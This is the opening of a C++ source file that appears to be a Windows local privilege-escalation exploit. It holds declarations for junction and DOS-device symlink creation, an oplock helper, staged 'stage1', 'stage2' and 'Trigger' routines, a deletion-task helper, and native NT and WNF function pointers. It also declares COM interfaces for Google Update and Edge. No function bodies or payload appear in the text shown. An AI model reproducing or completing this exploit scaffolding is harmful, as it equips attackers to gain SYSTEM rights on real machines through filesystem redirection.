#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <stdio.h>
#include <Msi.h>
#include <PathCch.h>
#include <taskschd.h>
#include <comdef.h>
#include <sddl.h>
#include <aclapi.h>
#include "FileOplock.h"
#include <shobjidl.h>
#include <shobjidl_core.h>
#include <shellapi.h>
#include <wuapi.h>
#include <shlobj.h>
#pragma warning(disable:4996)
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib,"RpcRT4.lib")
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "taskschd.lib")
struct __declspec(uuid("A6B716CB-028B-404D-B72C-50E153DD68DA")) CLSID_MSEdge_Object;
class __declspec(uuid("79e0c401-b7bc-4de5-8104-71350f3a9b67")) IGoogleUpdate : IUnknown {
public:


    HRESULT CheckForUpdate(const WCHAR* guid, VOID* observer);
    HRESULT Update(const WCHAR* guid, VOID* observer);

};
void cb1();
wchar_t dir[MAX_PATH] = { 0x0 };
WCHAR rbsPath[256] = { 0x0 };
wchar_t drivepath[MAX_PATH] = { 0x0 };
wchar_t tmp_file[MAX_PATH] = { 0x0 };
std::wstring ppath;
NTSTATUS retcode;
HANDLE h = NULL;
HANDLE hDir,hDir2,hDir3;
HANDLE hFile,hFile2;
wchar_t object[MAX_PATH] = L"Global\\GLOBALROOT\\RPC Control\\{99c69926-fd4c-4f33-9123-4815b659cda6}";
std::wstring drive;
BOOL deleted = FALSE;
void IfDeletedRemoveJunction(LPWSTR);
bool IfExists(LPCWSTR path);
VOID Trigger();
void cb0();
BOOL CreateDeleteTask(BOOL);
LPWSTR BuildPath(LPCWSTR);
void load();
void stage2();
void stage1();
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
BOOL Move(HANDLE hFile, std::wstring drive, LPCWSTR path);
BOOL CreateJunction(HANDLE hDir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(HANDLE hDir);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
VOID Watch();
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );
typedef  DWORD(WINAPI* _SetStorageSettings)(DWORD, DWORD, DWORD, DWORD);
_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;
_NtQueryDirectoryObject pNtQueryDirectoryObject;
_NtOpenDirectoryObject pNtOpenDirectoryObect;
_SetStorageSettings pSetStorageSettings;
typedef unsigned long long QWORD, * PQWORD;

typedef NTSTATUS(WINAPI* ZwQueryWnfStateNameInformationType)(PVOID, QWORD, QWORD, PVOID, QWORD);
ZwQueryWnfStateNameInformationType ZwQueryWnfStateNameInformation;

typedef NTSTATUS(WINAPI* ZwUpdateWnfStateDataType)(PVOID, PVOID, ULONG, PVOID, PVOID, PVOID, ULONG);
ZwUpdateWnfStateDataType ZwUpdateWnfStateData;


